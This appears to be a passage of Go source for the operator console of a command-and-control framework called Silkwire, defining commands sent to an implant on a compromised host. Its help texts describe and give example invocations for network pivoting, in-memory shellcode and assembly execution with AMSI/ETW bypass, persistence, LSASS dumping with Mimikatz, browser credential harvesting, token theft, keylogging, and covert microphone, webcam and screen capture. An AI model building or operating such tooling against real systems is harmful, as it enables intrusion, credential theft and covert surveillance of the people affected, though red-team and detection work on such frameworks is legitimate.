	moduleCmd.AddCommand(moduleConfigCmd)
	moduleCmd.AddCommand(moduleListCmd)

	// Add parent module command to session root
	sessionRootCmd.AddCommand(moduleCmd)

	// ===== TIER 1 HIGH-IMPACT FEATURES =====

	// SOCKS Proxy command
	socksCmd := &cobra.Command{
		Use:   "socks <start|stop> [port]",
		Short: "Manage SOCKS5 proxy for network pivoting",
		Long: `Start or stop a SOCKS5 proxy server on the target for network pivoting.

Examples:
  socks start 1080    Start SOCKS5 proxy on port 1080
  socks stop          Stop the running SOCKS proxy

Once started, configure your tools to use localhost:<port> as a SOCKS5 proxy
to route traffic through the compromised host.`,
		Args: cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			command := "socks " + strings.Join(args, " ")
			ocGlobal.executeSessionCommand(currentSessionID, command)
		},
	}
	sessionRootCmd.AddCommand(socksCmd)

	// Port Forward command
	portfwdCmd := &cobra.Command{
		Use:   "portfwd <add|remove|list> [options]",
		Short: "Manage port forwarding rules",
		Long: `Create, remove, or list port forwarding rules for accessing internal services.

Examples:
  portfwd add 3389 192.168.10.50 3389    Forward local 3389 to internal RDP
  portfwd add 8080 10.0.0.15 80          Forward local 8080 to internal web server
  portfwd remove 3389                    Remove port forward on 3389
  portfwd list                           List all active forwards

Once added, connect to localhost:<bind_port> to access the internal service.`,
		Args: cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			command := "portfwd " + strings.Join(args, " ")
			ocGlobal.executeSessionCommand(currentSessionID, command)
		},
	}
	sessionRootCmd.AddCommand(portfwdCmd)

	// Execute Assembly command (.NET) - Windows only
	if isWindows {
		executeAssemblyCmd := &cobra.Command{
			Use:                "execute-assembly <assembly_path> [args...]",
			Aliases:            []string{"exec-asm"},
			Short:              "Execute .NET assembly using Donut (Windows only)",
			DisableFlagParsing: true, // Disable Cobra flag parsing to allow assembly args with dashes
			Long: `Execute a .NET assembly in memory using server-side Donut conversion and
sacrificial process injection (default) or in-process CLR hosting (risky).

Examples:
  execute-assembly Seatbelt.exe -group=system
  execute-assembly -p 'C:\\Windows\\System32\\notepad.exe' Rubeus.exe kerberoast
  execute-assembly -p C:/Windows/System32/notepad.exe SharpDPAPI.exe
  execute-assembly --ppid 1234 SharpUp.exe

Windows Paths - Use ONE of these methods:
  1. Double backslashes:  -p 'C:\\Windows\\System32\\notepad.exe'
  2. Forward slashes:     -p C:/Windows/System32/notepad.exe  (Windows accepts these)

IMPORTANT: Silkwire flags (-p, -i, -a, etc.) must come BEFORE the assembly path.
  Correct:   execute-assembly -a -e Seatbelt.exe -group=system
  Incorrect: execute-assembly Seatbelt.exe -a -e  (treats -a -e as assembly args)`,
			Args: cobra.ArbitraryArgs,
			ValidArgsFunction: func(cmd *cobra.Command, args []string, toComplete string) ([]string, cobra.ShellCompDirective) {
				// Provide file completion for assembly path
				// This helps with autocomplete for .exe and .dll files
				return getFileCompletions(toComplete), cobra.ShellCompDirectiveNoSpace
			},
			Run: func(cmd *cobra.Command, args []string) {
				// Manual help handling
				if len(args) == 0 || args[0] == "-h" || args[0] == "--help" {
					cmd.Help()
					return
				}

				// Filter out empty strings from args
				var filteredArgs []string
				for _, arg := range args {
					if arg != "" {
						filteredArgs = append(filteredArgs, arg)
					}
				}

				// Pass everything directly to handleExecuteAssembly which does its own parsing
				command := "execute-assembly " + strings.Join(filteredArgs, " ")
				ocGlobal.executeSessionCommand(currentSessionID, command)
			},
		}

		// Add flags for help documentation (DisableFlagParsing means they won't be parsed by Cobra)
		executeAssemblyCmd.Flags().BoolP("in-process", "i", false, "Execute in implant process (RISKY)")
		executeAssemblyCmd.Flags().StringP("process", "p", "", "Sacrificial process path (default: dllhost.exe)")
		executeAssemblyCmd.Flags().StringP("appdomain", "d", "", "Custom AppDomain name (in-process only)")
		executeAssemblyCmd.Flags().StringP("runtime", "r", "", ".NET runtime version (default: v4)")
		executeAssemblyCmd.Flags().BoolP("amsi-bypass", "a", false, "Enable AMSI bypass")
		executeAssemblyCmd.Flags().BoolP("etw-bypass", "e", false, "Enable ETW bypass")
		executeAssemblyCmd.Flags().Uint32("ppid", 0, "Parent process ID for PPID spoofing")
		executeAssemblyCmd.Flags().StringP("class", "c", "", "Class name for DLL assemblies")
		executeAssemblyCmd.Flags().StringP("method", "m", "", "Method name for DLL assemblies")

		sessionRootCmd.AddCommand(executeAssemblyCmd)

		executeShellcodeCmd := &cobra.Command{
			Use:                "execute-shellcode [options] <shellcode>",
			Short:              "Execute raw shellcode in memory (Windows)",
			DisableFlagParsing: true,
			Long: `Execute raw shellcode using implant-side injection primitives.

Methods:
  self                  - Run shellcode inside the implant process
  remote                - CreateRemoteThread into target PID
  rtlcreateuserthread   - RtlCreateUserThread injection
  userapc               - QueueUserAPC across target threads

Examples:
  execute-shellcode beacon.bin
  execute-shellcode -m remote -p 1337 loader.bin
  execute-shellcode --method userapc --pid 888 --base64 AAAA....`,
			Args: cobra.ArbitraryArgs,
			ValidArgsFunction: func(cmd *cobra.Command, args []string, toComplete string) ([]string, cobra.ShellCompDirective) {
				return getFileCompletions(toComplete), cobra.ShellCompDirectiveNoFileComp
			},
			Run: func(cmd *cobra.Command, args []string) {
				if len(args) == 0 || args[0] == "-h" || args[0] == "--help" {
					cmd.Help()
					return
				}

				var filteredArgs []string
				for _, arg := range args {
					if arg != "" {
						filteredArgs = append(filteredArgs, arg)
					}
				}

				command := "execute-shellcode " + strings.Join(filteredArgs, " ")
				ocGlobal.executeSessionCommand(currentSessionID, command)
			},
		}
		sessionRootCmd.AddCommand(executeShellcodeCmd)

		executePeCmd := &cobra.Command{
			Use:                "execute-pe [options] <pe_path> [pe_args...]",
			Short:              "Execute native PE via sacrificial process (Donut)",
			DisableFlagParsing: true,
			Long: `Convert a native PE (EXE/DLL) to Donut shellcode on the server and execute
it inside a sacrificial process with stdout/stderr capture.

Examples:
  execute-pe mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords"
  execute-pe -p C:\\Windows\\System32\\dllhost.exe --ppid 4450 tool.exe`,
			Args: cobra.ArbitraryArgs,
			ValidArgsFunction: func(cmd *cobra.Command, args []string, toComplete string) ([]string, cobra.ShellCompDirective) {
				return getFileCompletions(toComplete), cobra.ShellCompDirectiveNoFileComp
			},
			Run: func(cmd *cobra.Command, args []string) {
				if len(args) == 0 || args[0] == "-h" || args[0] == "--help" {
					cmd.Help()
					return
				}

				var filteredArgs []string
				for _, arg := range args {
					if arg != "" {
						filteredArgs = append(filteredArgs, arg)
					}
				}

				command := "execute-pe " + strings.Join(filteredArgs, " ")
				ocGlobal.executeSessionCommand(currentSessionID, command)
			},
		}
		executePeCmd.Flags().StringP("process", "p", "", "Sacrificial spawn-to process (default: WerFault.exe)")
		executePeCmd.Flags().Uint32("ppid", 0, "Parent process ID for PPID spoofing")
		executePeCmd.Flags().String("spawn-args", "", "Command-line arguments for sacrificial process")
		sessionRootCmd.AddCommand(executePeCmd)

		// Execute BOF command - Windows only
		executeBofCmd := &cobra.Command{
			Use:                "execute-bof [options] <bof_path> [bof_args...]",
			Aliases:            []string{"bof"},
			Short:              "Execute Beacon Object Files (BOFs) via goffloader",
			DisableFlagParsing: true,
			Long: `Execute Cobalt Strike Beacon Object Files (BOFs) in-process using goffloader.

IMPORTANT: BOF arguments MUST have type prefixes:
  z<string>  - ANSI string (e.g., zMyString)
  Z<string>  - Wide/Unicode string (e.g., ZMyWideString)
  i<number>  - Integer 32-bit (e.g., i1234)
  s<number>  - Short 16-bit (e.g., s42)
  b<hex>     - Binary data (e.g., b41424344)

Platform Support:
  - Windows x64 ONLY (goffloader limitation)
  - 32-bit BOFs NOT supported yet

Examples:
  execute-bof whoami.x64.o
  execute-bof dir.x64.o zC:\\Windows
  execute-bof nslookup.x64.o zgoogle.com z8.8.8.8
  execute-bof netstat.x64.o --entry main
  bof inject.x64.o i1234 zexplorer.exe`,
			Args: cobra.ArbitraryArgs,
			ValidArgsFunction: func(cmd *cobra.Command, args []string, toComplete string) ([]string, cobra.ShellCompDirective) {
				return getFileCompletions(toComplete), cobra.ShellCompDirectiveNoFileComp
			},
			Run: func(cmd *cobra.Command, args []string) {
				if len(args) == 0 || args[0] == "-h" || args[0] == "--help" {
					cmd.Help()
					return
				}

				var filteredArgs []string
				for _, arg := range args {
					if arg != "" {
						filteredArgs = append(filteredArgs, arg)
					}
				}

				command := "execute-bof " + strings.Join(filteredArgs, " ")
				ocGlobal.executeSessionCommand(currentSessionID, command)
			},
		}
		executeBofCmd.Flags().String("entry", "go", "Entry point function name (default: go)")
		sessionRootCmd.AddCommand(executeBofCmd)
	}

	// Persistence command
	persistCmd := &cobra.Command{
		Use:   "persist <install|remove|list> [method]",
		Short: "Manage persistence mechanisms",
		Long: `Install, remove, or list persistence mechanisms to maintain access across reboots.

Windows Methods:
  registry  - HKCU Run key (user-level)
  task      - Scheduled Task at logon
  service   - Windows Service (requires admin)
  startup   - Startup folder shortcut

Linux/macOS Methods:
  cron      - Crontab @reboot entry
  systemd   - User systemd service
  bashrc    - .bashrc execution hook
  profile   - Shell profile (.bash_profile, .zshrc)
  launchd   - macOS LaunchAgent (macOS only)

Examples:
  persist install registry       Install registry Run key
  persist install task           Create scheduled task
  persist remove registry        Remove registry persistence
  persist list                   Show all installed persistence

Warning: Persistence mechanisms may be detected by EDR/AV solutions.`,
		Args: cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			command := "persist " + strings.Join(args, " ")
			ocGlobal.executeSessionCommand(currentSessionID, command)
		},
	}
	sessionRootCmd.AddCommand(persistCmd)

	// LSASS Dump command - Windows only
	if isWindows {
		lsassCmd := &cobra.Command{
			Use:   "lsass",
			Short: "Dump LSASS process memory (Windows, requires admin)",
			Long: `Dump the LSASS (Local Security Authority Subsystem Service) process memory.

The dump contains password hashes, Kerberos tickets, and cached credentials.
Parse offline with Mimikatz to extract credentials.

Method: MiniDumpWriteDump via comsvcs.dll
Requirements: Administrator or SYSTEM privileges
Platform: Windows only

WARNING: This is a high-risk operation often detected by EDR solutions.

Post-Processing:
  mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords"`,
			Run: func(cmd *cobra.Command, args []string) {
				ocGlobal.executeSessionCommand(currentSessionID, "lsass")
			},
		}
		sessionRootCmd.AddCommand(lsassCmd)
	}

	// Credential Harvest command
	harvestCmd := &cobra.Command{
		Use:   "harvest <chrome|firefox|edge|all>",
		Short: "Harvest saved credentials from browsers",
		Long: `Extract saved passwords and credentials from web browsers.

Supported Browsers:
  chrome   - Google Chrome (DPAPI decryption on Windows)
  firefox  - Mozilla Firefox (NSS encryption)
  edge     - Microsoft Edge (Chromium-based, DPAPI)
  all      - Harvest from all supported browsers

Examples:
  harvest chrome    Extract Chrome credentials only
  harvest all       Extract from all browsers

Platform Support:
  Windows - Full decryption support (DPAPI)
  Linux   - Partial support (system keyring required)
  macOS   - Partial support (Keychain access required)

Additional Unix Harvesting:
  - SSH private keys (~/.ssh/)
  - Bash command history
  - Environment variables`,
		Args: cobra.ExactArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			command := "harvest " + args[0]
			ocGlobal.executeSessionCommand(currentSessionID, command)
		},
	}
	sessionRootCmd.AddCommand(harvestCmd)

	// Process Migration command - Windows only
	if isWindows {
		migrateCmd := &cobra.Command{
			Use:   "migrate <pid>",
			Short: "Migrate implant to another process",
			Long: `Migrate the current implant into a different process.

Use Cases:
  - Move to more stable process (explorer.exe, svchost.exe)
  - Gain higher privileges (migrate to SYSTEM process)
  - Avoid detection (move out of suspicious process)

Recommendations:
  - Choose long-running system processes
  - Match architecture (x86 to x86, x64 to x64)
  - Prefer processes running as SYSTEM for persistence

Examples:
  ps                  # List processes first
  migrate 1234        # Migrate to PID 1234

Good Target Processes (Windows):
  - explorer.exe (user desktop process)
  - svchost.exe (system service host)
  - spoolsv.exe (print spooler)

WARNING: Migration may fail if target process has protections enabled.`,
			Args: cobra.ExactArgs(1),
			Run: func(cmd *cobra.Command, args []string) {
				command := "migrate " + args[0]
				ocGlobal.executeSessionCommand(currentSessionID, command)
			},
		}
		sessionRootCmd.AddCommand(migrateCmd)
	}

	// ===== SURVEILLANCE FEATURES =====

	// Clipboard Monitor command
	clipboardCmd := &cobra.Command{
		Use:   "clipboard [duration]",
		Short: "Monitor clipboard for changes",
		Long: `Monitor the target's clipboard for specified duration and capture all changes.

Duration: Time in seconds to monitor clipboard (default: 30)

The command will:
  - Capture clipboard content when it changes
  - Record timestamp of each change
  - Return all captured entries as JSON

Examples:
  clipboard          # Monitor for 30 seconds (default)
  clipboard 60       # Monitor for 60 seconds
  clipboard 120      # Monitor for 2 minutes

Output Format:
  JSON with array of clipboard entries including:
  - Timestamp of each capture
  - Clipboard content (text)
  - Total number of captures

Platform Support:
  Windows: Native Win32 API
  Linux:   xclip, xsel, or wl-paste required
  macOS:   pbpaste command`,
		Args: cobra.MaximumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			duration := "30"
			if len(args) > 0 {
				duration = args[0]
			}
			command := fmt.Sprintf("clipboard %s", duration)
			ocGlobal.executeSessionCommand(currentSessionID, command)
		},
	}
	sessionRootCmd.AddCommand(clipboardCmd)

	// Keylogger command
	keylogCmd := &cobra.Command{
		Use:   "keylog <start|stop>",
		Short: "Enhanced keylogger with window title tracking",
		Long: `Start or stop an enhanced keylogger that captures keystrokes with window context.

Features:
  - Captures all keystrokes in real-time
  - Records active window title for each keystroke
  - Tracks process name associated with each window
  - Converts special keys to readable format ([ENTER], [BACKSPACE], etc.)

Examples:
  keylog start       # Start keylogger
  keylog stop        # Stop and retrieve captured keystrokes

Output Format (on stop):
  JSON with array of keystroke entries including:
  - Timestamp
  - Captured key
  - Window title where key was pressed
  - Process name
  - Summary by window/application

Platform Support:
  Windows: SetWindowsHookEx keyboard hook + window tracking
  Linux:   X11/Wayland window tracking (limited, requires root for full keylogging)
  macOS:   Accessibility API (requires permissions)

Security Notes:
  - Keylogger runs in background until stopped
  - Maximum 10,000 entries cached to prevent memory issues
  - Data stored in memory only until retrieved
  - Use 'keylog stop' to get results and free resources`,
		Args: cobra.ExactArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			if args[0] != "start" && args[0] != "stop" {
				fmt.Printf("%s Invalid action. Use 'start' or 'stop'\n", colorize("[!]", colorRed))
				return
			}
			command := fmt.Sprintf("keylog %s", args[0])
			ocGlobal.executeSessionCommand(currentSessionID, command)
		},
	}
	sessionRootCmd.AddCommand(keylogCmd)

	// Screenshot command
	screenshotCmd := &cobra.Command{
		Use:   "screenshot",
		Short: "Capture screenshot and download to console",
		Long: `Capture a screenshot of the target system's primary display and automatically download it.

The command will:
  - Capture the entire primary screen on target
  - Save as PNG file in target's temp directory
  - Automatically download to console machine
  - Save as screenshot_<session-id>_<timestamp>.png

Workflow:
  1. Screenshot captured on target system
  2. Saved to temporary file
  3. File automatically downloaded to console
  4. Saved in current directory

Output:
  - Progress indicator during capture
  - Target file path
  - Download progress
  - Local file path confirmation

Platform Support:
  Windows: Native GDI/Win32 API via github.com/kbinani/screenshot
  Linux:   X11/Wayland via github.com/kbinani/screenshot
  macOS:   Native CoreGraphics via github.com/kbinani/screenshot

Example:
  screenshot
  
Result:
  screenshot_e87b7b0f_20251020_143022.png saved in current directory`,
		Run: func(cmd *cobra.Command, args []string) {
			ocGlobal.handleScreenshotCommand(currentSessionID)
		},
	}
	sessionRootCmd.AddCommand(screenshotCmd)

	// Audio Capture command
	audioCmd := &cobra.Command{
		Use:   "audio [duration]",
		Short: "Record audio from target's microphone",
		Long: `Record audio from the target system's default microphone.

Duration: Time in seconds to record (default: 5, max: 300)

The command will:
  - Access default microphone device
  - Record audio at 44.1kHz sample rate
  - Encode as WAV format
  - Return base64-encoded audio data

Examples:
  audio          # Record 5 seconds (default)
  audio 10       # Record 10 seconds
  audio 30       # Record 30 seconds

Output Format:
  JSON containing:
  - Audio format (WAV)
  - Duration in seconds
  - Sample rate (44100 Hz)
  - Audio size in bytes
  - Base64-encoded WAV audio data

Platform Support:
  Windows: WaveIn API for microphone access
  Linux:   arecord (ALSA), sox, or ffmpeg required
  macOS:   sox or ffmpeg with AVFoundation

Usage Tips:
  - Decode base64 and save as .wav file
  - Test microphone access before long recordings
  - File sizes: ~5MB per minute of mono audio

Example workflow:
  audio 10                             # Record 10 seconds
  # Save base64 data from JSON output
  echo "<base64_data>" | base64 -d > recording.wav

Security Considerations:
  - May trigger microphone access indicators
  - Requires microphone device access permissions
  - Audio quality depends on hardware`,
		Args: cobra.MaximumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			duration := "5"
			if len(args) > 0 {
				duration = args[0]
			}
			command := fmt.Sprintf("audio %s", duration)
			ocGlobal.executeSessionCommand(currentSessionID, command)
		},
	}
	sessionRootCmd.AddCommand(audioCmd)

	// Webcam Capture command
	webcamCmd := &cobra.Command{
		Use:   "webcam <photo|video> [duration]",
		Short: "Capture photo or video from target's webcam",
		Long: `Capture image or video from the target system's default webcam.

Format Options:
  photo  - Capture a single photo (instant)
  video  - Record video for specified duration

Duration: For video only, time in seconds (default: 5, max: 60)

The command will:
  - Access default webcam device
  - Capture photo (JPEG) or video (MP4)
  - Return base64-encoded media data

Examples:
  webcam photo           # Take a photo
  webcam video           # Record 5 seconds of video (default)
  webcam video 10        # Record 10 seconds of video
  webcam video 30        # Record 30 seconds of video

Output Format:
  JSON containing:
  - Media type (image/jpeg or video/mp4)
  - Media size in bytes
  - Capture duration
  - Format (photo or video)
  - Base64-encoded media data

Platform Support:
  Windows: DirectShow (ffmpeg required)
  Linux:   Video4Linux (ffmpeg required)
  macOS:   AVFoundation (ffmpeg required)

Requirements:
  - ffmpeg must be installed on target system
  - Webcam device must be available
  - May require camera access permissions

Usage Tips:
  - Photo captures are instant and small (~100-500KB)
  - Video files can be large (~1-5MB per 10 seconds)
  - Decode base64 and save as .jpg or .mp4

Example workflow:
  webcam photo                         # Capture photo
  # Save base64 data from JSON output
  echo "<base64_data>" | base64 -d > webcam.jpg
  
  webcam video 10                      # Record video
  echo "<base64_data>" | base64 -d > webcam.mp4

Security Considerations:
  - May trigger webcam activity indicators (LED)
  - Requires camera device access permissions
  - Video quality depends on webcam hardware`,
		Args: cobra.RangeArgs(1, 2),
		Run: func(cmd *cobra.Command, args []string) {
			format := args[0]
			duration := "0"
			if format != "photo" && format != "video" {
				fmt.Printf("%s Invalid format. Use 'photo' or 'video'\n", colorize("[!]", colorRed))
				return
			}
			if len(args) > 1 {
				duration = args[1]
			}
			command := fmt.Sprintf("webcam %s %s", format, duration)
			ocGlobal.executeSessionCommand(currentSessionID, command)
		},
	}
	sessionRootCmd.AddCommand(webcamCmd)

	// Token Manipulation Commands (Windows) - Windows only
	if isWindows {
		tokenCmd := &cobra.Command{
			Use:   "token",
			Short: "Windows access token manipulation (steal, impersonate, create)",
			Long: `Manipulate Windows access tokens for privilege escalation and lateral movement.

Available subcommands:
  list         - Enumerate available tokens from running processes
  steal        - Steal access token from a process
  impersonate  - Impersonate a previously stolen token
  revert       - Revert to original token
  make         - Create token with network credentials

Windows Only: Requires appropriate privileges for token operations.

Examples:
  token list                           # List available tokens
  token steal 1234                     # Steal token from PID 1234
  token impersonate token_1234_0       # Impersonate stolen token
  token make CORP admin P@ssw0rd       # Create token with credentials
  token revert                         # Revert to original token`,
		}

		tokenListCmd := &cobra.Command{
			Use:   "list",
			Short: "Enumerate available tokens from running processes",
			Long: `List all access tokens that can be stolen from running processes on the target system.

This command:
  - Enumerates running processes
  - Retrieves token information from each process
  - Displays username, domain, and integrity level
  - Shows process name and PID for each token

Windows Only: Requires appropriate privileges to access process tokens.

Example Output:
  Token ID        PID    Process         Username        Domain    Integrity
  token_1234      1234   explorer.exe    alice           CORP      High
  token_5678      5678   winlogon.exe    SYSTEM          NT AUTH   System`,
			Run: func(cmd *cobra.Command, args []string) {
				ocGlobal.executeSessionCommand(currentSessionID, "token-list")
			},
		}
		tokenCmd.AddCommand(tokenListCmd)

		tokenStealCmd := &cobra.Command{
			Use:   "steal <pid>",
			Short: "Steal access token from a running process",
			Long: `Steal an access token from a target process by its PID.

This command:
  - Opens the target process
  - Duplicates the process's access token
  - Stores the token for later impersonation
  - Returns a token ID for use with token impersonate

Requires: SeDebugPrivilege or appropriate access to target process

Example:
  token steal 1234               # Steal token from PID 1234`,
			Args: cobra.ExactArgs(1),
			Run: func(cmd *cobra.Command, args []string) {
				command := fmt.Sprintf("token-steal %s", args[0])
				ocGlobal.executeSessionCommand(currentSessionID, command)
			},
		}
		tokenCmd.AddCommand(tokenStealCmd)

		tokenImpersonateCmd := &cobra.Command{
			Use:   "impersonate <token_id>",
			Short: "Impersonate a previously stolen token",
			Long: `Impersonate a stolen access token to execute commands with different privileges.

This command:
  - Applies the specified token to the current thread
  - All subsequent commands execute under this token
  - Useful for privilege escalation and lateral movement

Use 'token list' to find available tokens, then 'token steal' to obtain them.

Example:
  token impersonate token_1234_0  # Impersonate the stolen token`,
			Args: cobra.ExactArgs(1),
			Run: func(cmd *cobra.Command, args []string) {
				command := fmt.Sprintf("token-impersonate %s", args[0])
				ocGlobal.executeSessionCommand(currentSessionID, command)
			},
		}
		tokenCmd.AddCommand(tokenImpersonateCmd)

		tokenRevertCmd := &cobra.Command{
			Use:   "revert",
			Short: "Revert to original token",
			Long: `Revert from impersonated token back to the original implant token.

This command:
  - Stops impersonating the current token
  - Restores the original process token
  - Returns to normal execution context

Safe to call even when not impersonating.`,
			Run: func(cmd *cobra.Command, args []string) {
				ocGlobal.executeSessionCommand(currentSessionID, "token-revert")
			},
		}
		tokenCmd.AddCommand(tokenRevertCmd)

		tokenMakeCmd := &cobra.Command{
			Use:   "make <domain> <username> <password>",
			Short: "Create and impersonate a token with network credentials",
			Long: `Create a new access token using LogonUser with network credentials.

Similar to Cobalt Strike's make_token, this creates a token using LOGON32_LOGON_NEW_CREDENTIALS.
The credentials are used for network authentication while local actions use the original token.

This command:
  - Creates a new token with provided credentials
  - Automatically impersonates the new token
  - Useful for accessing network resources with different credentials

Note: Credentials are used for network access, not local privilege escalation.

Example:
  token make CORP administrator P@ssw0rd
  token make . localuser password123`,
			Args: cobra.ExactArgs(3),
			Run: func(cmd *cobra.Command, args []string) {
				command := fmt.Sprintf("token-make %s %s %s", args[0], args[1], args[2])
				ocGlobal.executeSessionCommand(currentSessionID, command)
			},
		}
		tokenCmd.AddCommand(tokenMakeCmd)

		sessionRootCmd.AddCommand(tokenCmd)
	}

	// back command to return to main menu
	backCmd := &cobra.Command{
		Use:   "back",
		Short: "Return to main console",
		Run: func(cmd *cobra.Command, args []string) {
			fmt.Println(colorize("Returning to main console...", colorCyan))
			currentSessionID = ""
			// Exit cleanly from subprocess
			os.Exit(0)
		},
	}
	sessionRootCmd.AddCommand(backCmd)

	// exit command (alias for back)
	sessionExitCmd := &cobra.Command{
		Use:   "exit",
		Short: "Return to main console",
		Run: func(cmd *cobra.Command, args []string) {
			fmt.Println(colorize("Returning to main console...", colorCyan))
			currentSessionID = ""
			// Exit cleanly from subprocess
			os.Exit(0)
		},
	}
	sessionRootCmd.AddCommand(sessionExitCmd)

	// Apply colored templates to session commands
	applyColoredTemplates(sessionRootCmd)

	return sessionRootCmd
}

// startReeflectiveConsole boots an interactive REPL wired to Cobra commands
func startReeflectiveConsole() {
	if ocGlobal == nil {
		fmt.Println("Failed to initialize console")
		return
	}

	consoleApp := rfconsole.New("Silkwire")

	// Create a primary menu and set commands
	mainMenu := consoleApp.NewMenu("")
	mainMenu.SetCommands(func() *cobra.Command {
		return rootCmd
	})

	// Configure the prompt with hacker terminal theme style
	prompt := mainMenu.Prompt()
	// Set the prompt to use hacker theme - cyberpunk terminal aesthetics
	prompt.Primary = func() string {
		return createHackerPrompt()
	}

	// Pass consoleApp to OperatorConsole
	ocGlobal.consoleApp = consoleApp

	// Show welcome banner before starting the console
	ocGlobal.showWelcomeBanner()

	// Start notification display - messages ALWAYS show above prompt
	go ocGlobal.displayNotifications()

	// Switch to the main menu and start the console
	consoleApp.SwitchMenu("")
	_ = consoleApp.Start()
}

// main is the entry point of the application
func main() {
	initCobra()

	// Set up signal handling for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	// Ensure cleanup happens when program exits
	defer func() {
		if ocGlobal != nil {
			ocGlobal.Close()
		}
	}()

	// Handle signals in a goroutine
	go func() {
		sig := <-sigChan
		fmt.Printf("\n\nReceived %v, shutting down gracefully...\n", sig)
		if ocGlobal != nil {
			ocGlobal.Close()
		}
		os.Exit(0)
	}()

	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}
